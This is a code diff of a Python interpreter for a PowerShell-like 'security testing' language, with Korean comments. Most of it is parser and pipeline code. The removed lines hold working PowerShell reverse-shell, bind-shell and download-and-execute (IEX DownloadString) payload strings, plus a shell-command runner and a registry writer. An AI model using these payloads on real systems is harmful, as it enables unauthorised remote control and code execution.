@@ -1,7 +1,13 @@
 #!/usr/bin/env python3
 """
-PSP (PowerShellPlus) Interpreter
-화이트해커를 위한 Windows 보안 테스팅 언어
+PSP (PowerShellPlus) Interpreter - PowerShell 기반 보안 언어
+화이트햇 해킹과 보안 테스트를 위한 전문 프로그래밍 언어
+
+특징:
+- PowerShell의 객체 파이프라인과 cmdlet 구조
+- C언어의 타입 시스템과 제어 구조  
+- Python의 간결함과 가독성
+- 보안 테스트에 특화된 내장 함수들
 
 Author: PSP Development Team
 License: MIT
@@ -15,127 +21,171 @@ import socket
 import struct
 import hashlib
 import base64
-from typing import Dict, Any, List, Optional
+import json
+from typing import Dict, Any, List, Optional, Union
 import argparse
+from datetime import datetime
+import threading
+import time
+
+class PSPValue:
+    """PSP 값 객체 - PowerShell 스타일의 타입 시스템"""
+    def __init__(self, value: Any, type_name: str = None):
+        self.value = value
+        self.type_name = type_name or self._infer_type(value)
+        self.properties = {}
+    
+    def _infer_type(self, value):
+        if isinstance(value, bool):
+            return "bool"
+        elif isinstance(value, int):
+            return "int"
+        elif isinstance(value, float):
+            return "double"
+        elif isinstance(value, str):
+            return "string"
+        elif isinstance(value, list):
+            return "array"
+        elif isinstance(value, dict):
+            return "hashtable"
+        else:
+            return "object"
+    
+    def to_string(self):
+        if self.type_name == "array":
+            return "{" + ", ".join(str(item) for item in self.value) + "}"
+        elif self.type_name == "hashtable":
+            items = [f"{k}={v}" for k, v in self.value.items()]
+            return "@{" + "; ".join(items) + "}"
+        else:
+            return str(self.value)
+
+class PSPPipeline:
+    """PowerShell 스타일 파이프라인 처리"""
+    def __init__(self):
+        self.objects = []
+    
+    def add(self, obj):
+        if isinstance(obj, list):
+            self.objects.extend(obj)
+        else:
+            self.objects.append(obj)
+    
+    def where(self, condition_func):
+        filtered = []
+        for obj in self.objects:
+            if condition_func(obj):
+                filtered.append(obj)
+        return PSPPipeline.from_list(filtered)
+    
+    def select(self, selector_func):
+        selected = []
+        for obj in self.objects:
+            selected.append(selector_func(obj))
+        return PSPPipeline.from_list(selected)
+    
+    def foreach(self, action_func):
+        for obj in self.objects:
+            action_func(obj)
+        return self
+    
+    @staticmethod
+    def from_list(objects):
+        pipeline = PSPPipeline()
+        pipeline.objects = objects
+        return pipeline
 
 class PSPInterpreter:
+    """PSP 언어 인터프리터 - PowerShell 기반"""
+    
     def __init__(self):
-        self.variables = {}
-        self.functions = {}
-        self.builtin_functions = self._init_builtin_functions()
-        
-    def _init_builtin_functions(self):
-        """내장 함수들 초기화"""
+        self.variables = {}  # $변수명 -> PSPValue
+        self.functions = {}  # 사용자 정의 함수
+        self.cmdlets = self._init_cmdlets()  # 내장 cmdlet들
+        self.current_pipeline = None
+        self.last_exit_code = 0
+    
+    def _init_cmdlets(self):
+        """PowerShell 스타일 cmdlet들 초기화"""
         return {
-            # 네트워크 함수들
-            'connect': self._connect,
-            'send': self._send,
-            'recv': self._recv,
-            'scan_port': self._scan_port,
-            'scan_range': self._scan_range,
+            # 출력 관련 cmdlet
+            'Write-Output': self._write_output,
+            'Write-Host': self._write_host,
+            'Write-Error': self._write_error,
+            'Write-Warning': self._write_warning,
+            'Out-Host': self._out_host,
+            'Out-File': self._out_file,
+            'Out-String': self._out_string,
             
-            # 암호화/해시 함수들
-            'md5': self._md5,
-            'sha1': self._sha1,
-            'sha256': self._sha256,
-            'base64_encode': self._base64_encode,
-            'base64_decode': self._base64_decode,
+            # 네트워크 보안 cmdlet
+            'Test-NetConnection': self._test_net_connection,
+            'Invoke-PortScan': self._invoke_port_scan,
+            'Start-PacketCapture': self._start_packet_capture,
+            'Get-NetworkTopology': self._get_network_topology,
+            'Test-SQLInjection': self._test_sql_injection,
+            'Invoke-WebScan': self._invoke_web_scan,
             
-            # 페이로드/익스플로잇 함수들
-            'create_payload': self._create_payload,
-            'buffer_overflow': self._buffer_overflow,
-            'shellcode': self._shellcode,
+            # 시스템 보안 cmdlet  
+            'Get-ProcessList': self._get_process_list,
+            'Get-ServiceList': self._get_service_list,
+            'Find-SensitiveFiles': self._find_sensitive_files,
+            'Invoke-MemoryDump': self._invoke_memory_dump,
+            'Get-SystemInfo': self._get_system_info,
+            'Test-Privilege': self._test_privilege,
             
-            # 윈도우 특화 함수들
-            'enum_processes': self._enum_processes,
-            'enum_services': self._enum_services,
-            'registry_read': self._registry_read,
-            'registry_write': self._registry_write,
+            # 암호화/해싱 cmdlet
+            'ConvertTo-MD5Hash': self._convert_to_md5,
+            'ConvertTo-SHA256Hash': self._convert_to_sha256,
+            'Invoke-HashCracking': self._invoke_hash_cracking,
+            'New-RSAKeyPair': self._new_rsa_keypair,
+            'Protect-Data': self._protect_data,
+            'Unprotect-Data': self._unprotect_data,
             
-            # 파일 시스템 함수들
-            'file_read': self._file_read,
-            'file_write': self._file_write,
-            'file_exists': self._file_exists,
-            'dir_list': self._dir_list,
+            # 파일 시스템 cmdlet
+            'Test-Path': self._test_path,
+            'Get-Content': self._get_content,
+            'Set-Content': self._set_content,
+            'Get-ChildItem': self._get_child_item,
+            'New-Item': self._new_item,
+            'Remove-Item': self._remove_item,
             
-            # 출력 함수들
-            'print': self._print,
-            'printf': self._printf,
-            'log': self._log,
+            # 필터링 cmdlet
+            'Where-Object': self._where_object,
+            'Select-Object': self._select_object,
+            'ForEach-Object': self._foreach_object,
+            'Sort-Object': self._sort_object,
+            'Group-Object': self._group_object,
             
-            # 시간/날짜 함수들
-            'get_current_time': self._get_current_time,
-            'sleep': self._sleep,
-            
-            # 유틸리티 함수들
-            'array_to_string': self._array_to_string,
-            'list_to_string': self._list_to_string,
-            'dict_to_string': self._dict_to_string,
-            'string_to_int': self._string_to_int,
-            'random_int': self._random_int,
-            'random_bool': self._random_bool,
-            
-            # 파일 시스템 함수들
-            'file_exists': self._file_exists,
-            'file_read': self._file_read,
-            'file_write': self._file_write,
-            'file_delete': self._file_delete,
-            'file_get_size': self._file_get_size,
-            'dir_exists': self._dir_exists,
-            'dir_create': self._dir_create,
-            'dir_delete': self._dir_delete,
-            
-            # 시스템 함수들
-            'get_os_info': self._get_os_info,
-            'get_current_user': self._get_current_user,
-            'get_current_directory': self._get_current_directory,
-            'get_env_var': self._get_env_var,
-            'execute_command': self._execute_command,
-            'get_memory_usage': self._get_memory_usage,
-            
-            # 네트워크 확장 함수들
-            'ping': self._ping,
-            'tcp_connect': self._tcp_connect,
-            'tcp_banner_grab': self._tcp_banner_grab,
-            'get_service_name': self._get_service_name,
-            'http_get_headers': self._http_get_headers,
-            'http_get_content': self._http_get_content,
-            'http_get_status': self._http_get_status,
-            'url_encode': self._url_encode,
-            
-            # 해시 크래킹 함수들
-            'hash_md5': self._hash_md5,
-            'hash_sha1': self._hash_sha1,
-            'hash_sha256': self._hash_sha256,
-            'crack_hash_md5': self._crack_hash_md5,
-            'generate_combinations': self._generate_combinations,
-            
-            # 암호화 함수들
-            'aes_encrypt': self._aes_encrypt,
-            'aes_decrypt': self._aes_decrypt,
-            'des_encrypt': self._des_encrypt,
-            'des_decrypt': self._des_decrypt,
-            'rsa_generate_keypair': self._rsa_generate_keypair,
-            'rsa_encrypt': self._rsa_encrypt,
-            'rsa_decrypt': self._rsa_decrypt,
-            
-            # 보안 테스트 함수들
-            'port_scan': self._port_scan,
-            'sql_injection_test': self._sql_injection_test,
-            'xss_test': self._xss_test,
-            'generate_xss_payload': self._generate_xss_payload,
+            # 유틸리티 cmdlet
+            'Get-Date': self._get_date,
+            'Start-Sleep': self._start_sleep,
+            'Measure-Command': self._measure_command,
+            'Get-Random': self._get_random,
+            'ConvertTo-Json': self._convert_to_json,
+            'ConvertFrom-Json': self._convert_from_json,
+            'Clear-Host': self._clear_host,
+            'Read-Host': self._read_host,
+            'Compare-Object': self._compare_object,
+            'Join-String': self._join_string,
+            'Get-Hash': self._get_hash,
+            'Get-ServiceBanner': self._get_service_banner,
+            'New-Payload': self._new_payload,
+            'ConvertTo-Base64': self._convert_to_base64,
+            'ConvertFrom-Base64': self._convert_from_base64,
+            'Get-ItemProperty': self._get_item_property,
+            'Write-EventLog': self._write_event_log,
         }
     
-    def execute_file(self, filename: str):
+    def run_file(self, filename: str):
         """PSP 파일 실행"""
         try:
             with open(filename, 'r', encoding='utf-8') as f:
                 content = f.read()
             self.execute(content)
         except FileNotFoundError:
-            print(f"오류: 파일 '{filename}'을 찾을 수 없습니다.")
+            self._write_error([f"파일 '{filename}'을 찾을 수 없습니다."])
         except Exception as e:
-            print(f"실행 오류: {e}")
+            self._write_error([f"실행 오류: {e}"])
     
     def execute(self, code: str):
         """PSP 코드 실행"""
@@ -147,740 +197,763 @@ class PSPInterpreter:
                 try:
                     i = self._execute_line(line, lines, i)
                 except Exception as e:
-                    print(f"라인 {i+1} 오류: {e}")
+                    self._write_error([f"라인 {i+1} 오류: {e}"])
                     break
             i += 1
     
     def _execute_line(self, line: str, all_lines: List[str], current_index: int) -> int:
-        """개별 라인 실행"""
-        # 변수 할당
-        if '=' in line and not any(op in line for op in ['==', '!=', '>=', '<=']):
-            self._handle_assignment(line)
+        """개별 라인 실행 - PowerShell 스타일"""
+        
+        # 파이프라인 처리
+        if '|' in line:
+            return self._execute_pipeline(line)
+        
+        # 변수 할당 ($변수 = 값)
+        if re.match(r'\$\w+\s*=', line):
+            self._handle_variable_assignment(line)
             return current_index + 1
         
-        # 함수 호출
-        if '(' in line and ')' in line:
-            self._handle_function_call(line)
+        # 타입이 있는 변수 선언 (int $var = value)
+        if re.match(r'(int|string|bool|double|array|hashtable)\s+\$\w+', line):
+            self._handle_typed_variable(line)
             return current_index + 1
         
-        # 조건문
+        # cmdlet 호출
+        if re.match(r'[A-Z][a-z]*-[A-Z][a-zA-Z]*', line):
+            self._execute_cmdlet(line)
+            return current_index + 1
+        
+        # 제어 구조
         if line.startswith('if '):
             return self._handle_if_statement(all_lines, current_index)
-        
-        # 반복문
-        if line.startswith('for '):
+        elif line.startswith('foreach '):
+            return self._handle_foreach_loop(all_lines, current_index)
+        elif line.startswith('while '):
+            return self._handle_while_loop(all_lines, current_index)
+        elif line.startswith('for '):
             return self._handle_for_loop(all_lines, current_index)
         
-        # while 루프
-        if line.startswith('while '):
-            return self._handle_while_loop(all_lines, current_index)
+        # 함수 정의
+        if line.startswith('function ') or re.match(r'(int|string|bool|void)\s+\w+\s*\(', line):
+            return self._handle_function_definition(all_lines, current_index)
         
         return current_index + 1
     
-    def _handle_assignment(self, line: str):
-        """변수 할당 처리"""
-        parts = line.split('=', 1)
-        var_name = parts[0].strip()
-        value = self._evaluate_expression(parts[1].strip())
-        self.variables[var_name] = value
-    
-    def _handle_function_call(self, line: str):
-        """함수 호출 처리"""
-        # 함수 이름과 파라미터 파싱
-        match = re.match(r'(\w+)\((.*)\)', line)
-        if match:
-            func_name = match.group(1)
-            params_str = match.group(2)
-            params = self._parse_parameters(params_str)
-            
-            if func_name in self.builtin_functions:
-                return self.builtin_functions[func_name](params)
-            else:
-                raise Exception(f"알 수 없는 함수: {func_name}")
-    
-    def _parse_parameters(self, params_str: str) -> List[Any]:
-        """파라미터 파싱"""
-        if not params_str.strip():
-            return []
+    def _execute_pipeline(self, line: str) -> int:
+        """파이프라인 실행"""
+        stages = [stage.strip() for stage in line.split('|')]
         
-        params = []
-        for param in params_str.split(','):
-            param = param.strip()
-            params.append(self._evaluate_expression(param))
-        return params
+        # 첫 번째 단계 실행
+        first_stage = stages[0]
+        if first_stage.startswith('"') and first_stage.endswith('"'):
+            # 문자열 리터럴
+            result = PSPValue(first_stage[1:-1], "string")
+        elif first_stage.startswith('$'):
+            # 변수
+            var_name = first_stage[1:]
+            if var_name in self.variables:
+                result = self.variables[var_name]
+            else:
+                raise Exception(f"변수 ${var_name}이 정의되지 않았습니다")
+        else:
+            # cmdlet 실행
+            result = self._execute_cmdlet_with_result(first_stage)
+        
+        # 파이프라인 체인 실행
+        current_pipeline = PSPPipeline()
+        if isinstance(result.value, list):
+            current_pipeline.objects = result.value
+        else:
+            current_pipeline.objects = [result.value]
+        
+        for stage in stages[1:]:
+            current_pipeline = self._execute_pipeline_stage(stage, current_pipeline)
+        
+        return 1
+    
+    def _execute_pipeline_stage(self, stage: str, input_pipeline: PSPPipeline) -> PSPPipeline:
+        """파이프라인 단계 실행"""
+        if stage.startswith('Where-Object'):
+            # Where-Object {조건} 처리
+            condition_match = re.search(r'\{([^}]+)\}', stage)
+            if condition_match:
+                condition = condition_match.group(1)
+                return input_pipeline.where(lambda obj: self._evaluate_condition(condition, obj))
+        
+        elif stage.startswith('Select-Object'):
+            # Select-Object 속성 처리
+            props_match = re.search(r'Select-Object\s+(.+)', stage)
+            if props_match:
+                props = props_match.group(1).split(',')
+                return input_pipeline.select(lambda obj: self._select_properties(obj, props))
+        
+        elif stage.startswith('ForEach-Object'):
+            # ForEach-Object {액션} 처리
+            action_match = re.search(r'\{([^}]+)\}', stage)
+            if action_match:
+                action = action_match.group(1)
+                return input_pipeline.foreach(lambda obj: self._execute_action(action, obj))
+        
+        elif stage == 'Out-Host':
+            # 결과 출력
+            for obj in input_pipeline.objects:
+                print(obj)
+            return input_pipeline
+        
+        return input_pipeline
+    
+    def _handle_variable_assignment(self, line: str):
+        """변수 할당 처리 ($변수 = 값)"""
+        match = re.match(r'\$(\w+)\s*=\s*(.+)', line)
+        if match:
+            var_name = match.group(1)
+            value_expr = match.group(2).strip()
+            value = self._evaluate_expression(value_expr)
+            self.variables[var_name] = PSPValue(value)
+    
+    def _handle_typed_variable(self, line: str):
+        """타입이 있는 변수 선언 처리"""
+        match = re.match(r'(int|string|bool|double|array|hashtable)\s+\$(\w+)\s*=\s*(.+)', line)
+        if match:
+            type_name = match.group(1)
+            var_name = match.group(2)
+            value_expr = match.group(3).strip()
+            
+            value = self._evaluate_expression(value_expr)
+            # 타입 변환
+            if type_name == "int":
+                value = int(value) if isinstance(value, (str, float)) else value
+            elif type_name == "string":
+                value = str(value)
+            elif type_name == "bool":
+                value = bool(value)
+            elif type_name == "double":
+                value = float(value) if isinstance(value, (str, int)) else value
+            
+            self.variables[var_name] = PSPValue(value, type_name)
+    
+    def _execute_cmdlet(self, line: str):
+        """cmdlet 실행"""
+        result = self._execute_cmdlet_with_result(line)
+        if result and hasattr(result, 'value'):
+            if isinstance(result.value, list):
+                for item in result.value:
+                    print(item)
+            else:
+                print(result.value)
+    
+    def _execute_cmdlet_with_result(self, line: str) -> PSPValue:
+        """cmdlet 실행하고 결과 반환"""
+        # cmdlet 이름과 파라미터 파싱
+        parts = line.split()
+        cmdlet_name = parts[0]
+        
+        if cmdlet_name in self.cmdlets:
+            # 파라미터 파싱
+            params = []
+            i = 1
+            while i < len(parts):
+                param = parts[i]
+                if param.startswith('-'):
+                    # named parameter (-Port 80)
+                    if i + 1 < len(parts):
+                        params.append((param[1:], self._evaluate_expression(parts[i + 1])))
+                        i += 2
+                    else:
+                        params.append((param[1:], True))
+                        i += 1
+                else:
+                    # positional parameter
+                    params.append(self._evaluate_expression(param))
+                    i += 1
+            
+            return self.cmdlets[cmdlet_name](params)
+        else:
+            raise Exception(f"알 수 없는 cmdlet: {cmdlet_name}")
     
     def _evaluate_expression(self, expr: str) -> Any:
         """표현식 평가"""
         expr = expr.strip()
         
         # 문자열 리터럴
-        if expr.startswith('"') and expr.endswith('"'):
+        if (expr.startswith('"') and expr.endswith('"')) or (expr.startswith("'") and expr.endswith("'")):
             return expr[1:-1]
         
         # 숫자
-        try:
+        if expr.isdigit() or (expr.startswith('-') and expr[1:].isdigit()):
             return int(expr)
+        
+        # 실수
+        try:
+            return float(expr)
         except ValueError:
-            try:
-                return float(expr)
-            except ValueError:
-                pass
+            pass
         
-        # 변수
-        if expr in self.variables:
-            return self.variables[expr]
+        # 불린
+        if expr.lower() in ['$true', 'true']:
+            return True
+        elif expr.lower() in ['$false', 'false']:
+            return False
         
-        # 함수 호출
-        if '(' in expr:
-            return self._handle_function_call(expr)
+        # 변수 참조
+        if expr.startswith('$'):
+            var_name = expr[1:]
+            if var_name in self.variables:
+                return self.variables[var_name].value
+            else:
+                raise Exception(f"변수 ${var_name}이 정의되지 않았습니다")
+        
+        # 배열 @(1, 2, 3)
+        if expr.startswith('@(') and expr.endswith(')'):
+            items_str = expr[2:-1]
+            if items_str.strip():
+                items = [self._evaluate_expression(item.strip()) for item in items_str.split(',')]
+                return items
+            return []
+        
+        # 해시테이블 @{key=value}
+        if expr.startswith('@{') and expr.endswith('}'):
+            items_str = expr[2:-1]
+            result = {}
+            if items_str.strip():
+                for item in items_str.split(';'):
+                    if '=' in item:
+                        key, value = item.split('=', 1)
+                        result[key.strip()] = self._evaluate_expression(value.strip())
+            return result
+        
+        # 범위 연산자 1..10
+        if '..' in expr and not expr.startswith('.'):
+            parts = expr.split('..')
+            if len(parts) == 2:
+                start = int(self._evaluate_expression(parts[0]))
+                end = int(self._evaluate_expression(parts[1]))
+                return list(range(start, end + 1))
         
         return expr
     
-    # 내장 함수 구현들
-    def _connect(self, host: str, port: int) -> bool:
-        """TCP 연결"""
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(5)
-            result = sock.connect_ex((host, port))
-            sock.close()
-            return result == 0
-        except Exception:
-            return False
+    # =================================================================
+    # cmdlet 구현들
+    # =================================================================
     
-    def _send(self, host: str, port: int, data: str) -> bool:
-        """데이터 전송"""
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((host, port))
-            sock.send(data.encode())
-            sock.close()
-            return True
-        except Exception:
-            return False
+    def _write_output(self, params) -> PSPValue:
+        """Write-Output cmdlet"""
+        for param in params:
+            if isinstance(param, tuple):
+                continue
+            print(param)
+        return PSPValue(None)
     
-    def _recv(self, host: str, port: int, size: int = 1024) -> str:
-        """데이터 수신"""
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((host, port))
-            data = sock.recv(size)
-            sock.close()
-            return data.decode()
-        except Exception:
-            return ""
+    def _write_host(self, params) -> PSPValue:
+        """Write-Host cmdlet"""
+        output = ""
+        for param in params:
+            if isinstance(param, tuple):
+                if param[0] == "ForegroundColor":
+                    continue  # 색상은 시뮬레이션
+            else:
+                output += str(param) + " "
+        print(output.strip())
+        return PSPValue(None)
     
-    def _scan_port(self, host: str, port: int) -> bool:
-        """포트 스캔"""
-        return self._connect(host, port)
+    def _write_error(self, params) -> PSPValue:
+        """Write-Error cmdlet"""
+        for param in params:
+            if not isinstance(param, tuple):
+                print(f"ERROR: {param}", file=sys.stderr)
+        return PSPValue(None)
     
-    def _scan_range(self, host: str, start_port: int, end_port: int) -> List[int]:
-        """포트 범위 스캔"""
-        open_ports = []
-        for port in range(start_port, end_port + 1):
-            if self._scan_port(host, port):
-                open_ports.append(port)
-        return open_ports
+    def _write_warning(self, params) -> PSPValue:
+        """Write-Warning cmdlet"""
+        for param in params:
+            if not isinstance(param, tuple):
+                print(f"WARNING: {param}")
+        return PSPValue(None)
     
-    def _md5(self, data: str) -> str:
-        """MD5 해시"""
-        return hashlib.md5(data.encode()).hexdigest()
+    def _out_host(self, params) -> PSPValue:
+        """Out-Host cmdlet"""
+        return self._write_output(params)
     
-    def _sha1(self, data: str) -> str:
-        """SHA1 해시"""
-        return hashlib.sha1(data.encode()).hexdigest()
-    
-    def _sha256(self, data: str) -> str:
-        """SHA256 해시"""
-        return hashlib.sha256(data.encode()).hexdigest()
-    
-    def _base64_encode(self, data: str) -> str:
-        """Base64 인코딩"""
-        return base64.b64encode(data.encode()).decode()
-    
-    def _base64_decode(self, data: str) -> str:
-        """Base64 디코딩"""
-        return base64.b64decode(data.encode()).decode()
-    
-    def _create_payload(self, payload_type: str, target: str = "", options: str = "") -> str:
-        """페이로드 생성"""
-        payloads = {
-            "reverse_shell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{target}',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
-            "bind_shell": "powershell -nop -c \"$listener = [System.Net.Sockets.TcpListener]4444; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\"",
-            "download_exec": f"powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('{target}')\""
-        }
-        return payloads.get(payload_type, "")
-    
-    def _buffer_overflow(self, target_size: int, padding: str = "A") -> str:
-        """버퍼 오버플로우 패턴 생성"""
-        return padding * target_size
-    
-    def _shellcode(self, arch: str = "x64") -> str:
-        """셸코드 생성"""
-        if arch == "x64":
-            return "\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2\\x48\\xff\\xc0\\x48\\x89\\xc7\\x48\\xff\\xc0\\x48\\xff\\xc0\\x48\\xff\\xc0\\x48\\x89\\xc6"
-        else:
-            return "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x40\\x89\\xc7\\x40\\x40\\x40\\x89\\xc6"
-    
-    def _enum_processes(self) -> List[str]:
-        """프로세스 열거"""
-        try:
-            result = subprocess.run(['tasklist'], capture_output=True, text=True, shell=True)
-            return result.stdout.split('\n')
-        except Exception:
-            return []
-    
-    def _enum_services(self) -> List[str]:
-        """서비스 열거"""
-        try:
-            result = subprocess.run(['sc', 'query'], capture_output=True, text=True, shell=True)
-            return result.stdout.split('\n')
-        except Exception:
-            return []
-    
-    def _registry_read(self, key: str, value: str = "") -> str:
-        """레지스트리 읽기"""
-        try:
-            cmd = f'reg query "{key}"'
-            if value:
-                cmd += f' /v "{value}"'
-            result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
-            return result.stdout
-        except Exception:
-            return ""
-    
-    def _registry_write(self, key: str, value: str, data: str, reg_type: str = "REG_SZ") -> bool:
-        """레지스트리 쓰기"""
-        try:
-            cmd = f'reg add "{key}" /v "{value}" /t {reg_type} /d "{data}" /f'
-            result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
-            return result.returncode == 0
-        except Exception:
-            return False
-    
-    def _file_read(self, filepath: str) -> str:
-        """파일 읽기"""
-        try:
-            with open(filepath, 'r', encoding='utf-8') as f:
-                return f.read()
-        except Exception:
-            return ""
-    
-    def _file_write(self, filepath: str, content: str) -> bool:
-        """파일 쓰기"""
-        try:
-            with open(filepath, 'w', encoding='utf-8') as f:
-                f.write(content)
-            return True
-        except Exception:
-            return False
-    
-    def _file_exists(self, filepath: str) -> bool:
-        """파일 존재 확인"""
-        return os.path.exists(filepath)
-    
-    def _dir_list(self, dirpath: str = ".") -> List[str]:
-        """디렉터리 목록"""
-        try:
-            return os.listdir(dirpath)
-        except Exception:
-            return []
-    
-    def _print(self, args) -> None:
-        """출력"""
-        if args:
-            # 변수 이름을 실제 값으로 치환
-            resolved_args = []
-            for arg in args:
-                if isinstance(arg, str) and arg in self.variables:
-                    resolved_args.append(self.variables[arg])
-                else:
-                    resolved_args.append(arg)
-            print(*resolved_args)
-        else:
-            print()
-    
-    def _printf(self, args) -> None:
-        """포맷 출력"""
-        if not args:
-            return
+    def _test_net_connection(self, params) -> PSPValue:
+        """Test-NetConnection cmdlet"""
+        host = "localhost"
+        port = None
         
-        format_str = args[0]
-        values = args[1:] if len(args) > 1 else []
+        for param in params:
+            if isinstance(param, tuple):
+                if param[0] == "Port":
+                    port = int(param[1])
+            else:
+                host = str(param)
         
         try:
-            # 변수 이름을 실제 값으로 치환
-            resolved_values = []
-            for val in values:
-                if isinstance(val, str) and val in self.variables:
-                    resolved_values.append(self.variables[val])
-                else:
-                    resolved_values.append(val)
-            
-            # C 스타일 포맷팅을 Python으로 변환
-            python_format = format_str.replace('%s', '{}').replace('%d', '{}').replace('%f', '{}').replace('%.2f', '{:.2f}').replace('\\n', '\n')
-            print(python_format.format(*resolved_values))
-        except Exception as e:
-            # 포맷 변환 실패시 기본 출력
-            print(args)
-    
-    def _log(self, message: str, level: str = "INFO") -> None:
-        """로그 출력"""
-        print(f"[{level}] {message}")
-    
-    # 제어 구조 처리
-    def _handle_if_statement(self, lines: List[str], start_index: int) -> int:
-        """if 문 처리"""
-        # 간단한 if 구현 (실제로는 더 복잡한 파싱이 필요)
-        return start_index + 1
-    
-    def _handle_for_loop(self, lines: List[str], start_index: int) -> int:
-        """for 루프 처리"""
-        # 간단한 for 구현
-        return start_index + 1
-    
-    def _handle_while_loop(self, lines: List[str], start_index: int) -> int:
-        """while 루프 처리"""
-        # 간단한 while 구현
-        return start_index + 1
-    
-    # 시간/날짜 함수들
-    def _get_current_time(self, args):
-        """현재 시간 반환"""
-        import datetime
-        return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
-    def _sleep(self, args):
-        """지정된 시간(ms) 동안 대기"""
-        import time
-        if args:
-            ms = int(args[0])
-            time.sleep(ms / 1000.0)
-        return None
-    
-    # 유틸리티 함수들
-    def _array_to_string(self, args):
-        """배열을 문자열로 변환"""
-        if args and isinstance(args[0], list):
-            return str(args[0])
-        return "[]"
-    
-    def _list_to_string(self, args):
-        """리스트를 문자열로 변환"""
-        if args and isinstance(args[0], list):
-            return ', '.join(str(x) for x in args[0])
-        return ""
-    
-    def _dict_to_string(self, args):
-        """딕셔너리를 문자열로 변환"""
-        if args and isinstance(args[0], dict):
-            return str(args[0])
-        return "{}"
-    
-    def _string_to_int(self, args):
-        """문자열을 정수로 변환"""
-        if args:
-            try:
-                return int(args[0])
-            except:
-                return 0
-        return 0
-    
-    def _random_int(self, args):
-        """랜덤 정수 생성"""
-        import random
-        if len(args) >= 2:
-            return random.randint(int(args[0]), int(args[1]))
-        return random.randint(0, 100)
-    
-    def _random_bool(self, args):
-        """랜덤 불린 값 생성"""
-        import random
-        return random.choice([True, False])
-    
-    # 파일 시스템 함수들
-    def _file_exists(self, args):
-        """파일 존재 여부 확인"""
-        if args:
-            return os.path.exists(args[0])
-        return False
-    
-    def _file_read(self, args):
-        """파일 읽기"""
-        if args and os.path.exists(args[0]):
-            try:
-                with open(args[0], 'r', encoding='utf-8') as f:
-                    return f.read()
-            except:
-                return ""
-        return ""
-    
-    def _file_write(self, args):
-        """파일 쓰기"""
-        if len(args) >= 2:
-            try:
-                with open(args[0], 'w', encoding='utf-8') as f:
-                    f.write(str(args[1]))
-                return True
-            except:
-                return False
-        return False
-    
-    def _file_delete(self, args):
-        """파일 삭제"""
-        if args and os.path.exists(args[0]):
-            try:
-                os.remove(args[0])
-                return True
-            except:
-                return False
-        return False
-    
-    def _file_get_size(self, args):
-        """파일 크기 반환"""
-        if args and os.path.exists(args[0]):
-            try:
-                return os.path.getsize(args[0])
-            except:
-                return 0
-        return 0
-    
-    def _dir_exists(self, args):
-        """디렉토리 존재 여부 확인"""
-        if args:
-            return os.path.isdir(args[0])
-        return False
-    
-    def _dir_create(self, args):
-        """디렉토리 생성"""
-        if args:
-            try:
-                os.makedirs(args[0], exist_ok=True)
-                return True
-            except:
-                return False
-        return False
-    
-    def _dir_delete(self, args):
-        """디렉토리 삭제"""
-        if args and os.path.exists(args[0]):
-            try:
-                import shutil
-                shutil.rmtree(args[0])
-                return True
-            except:
-                return False
-        return False
-    
-    # 시스템 함수들
-    def _get_os_info(self, args):
-        """운영체제 정보 반환"""
-        import platform
-        return f"{platform.system()} {platform.release()}"
-    
-    def _get_current_user(self, args):
-        """현재 사용자명 반환"""
-        import getpass
-        return getpass.getuser()
-    
-    def _get_current_directory(self, args):
-        """현재 작업 디렉토리 반환"""
-        return os.getcwd()
-    
-    def _get_env_var(self, args):
-        """환경변수 값 반환"""
-        if args:
-            return os.environ.get(args[0], "")
-        return ""
-    
-    def _execute_command(self, args):
-        """시스템 명령 실행"""
-        if args:
-            try:
-                result = subprocess.run(args[0], shell=True, capture_output=True, text=True)
-                return result.stdout.strip()
-            except:
-                return ""
-        return ""
-    
-    def _get_memory_usage(self, args):
-        """메모리 사용량 반환 (KB 단위)"""
-        try:
-            import psutil
-            return psutil.virtual_memory().used // 1024
-        except:
-            return 0
-    
-    # 네트워크 확장 함수들
-    def _ping(self, args):
-        """ICMP 핑 테스트"""
-        if args:
-            host = args[0]
-            count = int(args[1]) if len(args) > 1 else 1
-            try:
-                cmd = f"ping -c {count} {host}" if os.name != 'nt' else f"ping -n {count} {host}"
-                result = subprocess.run(cmd, shell=True, capture_output=True)
-                return result.returncode == 0
-            except:
-                return False
-        return False
-    
-    def _tcp_connect(self, args):
-        """TCP 연결 테스트"""
-        if len(args) >= 2:
-            host = args[0]
-            port = int(args[1])
-            timeout = int(args[2]) if len(args) > 2 else 3
-            try:
+            if port:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(timeout)
+                sock.settimeout(3)
                 result = sock.connect_ex((host, port))
                 sock.close()
-                return result == 0
-            except:
-                return False
-        return False
+                
+                return PSPValue({
+                    "ComputerName": host,
+                    "Port": port,
+                    "TcpTestSucceeded": result == 0,
+                    "RemoteAddress": host
+                }, "hashtable")
+            else:
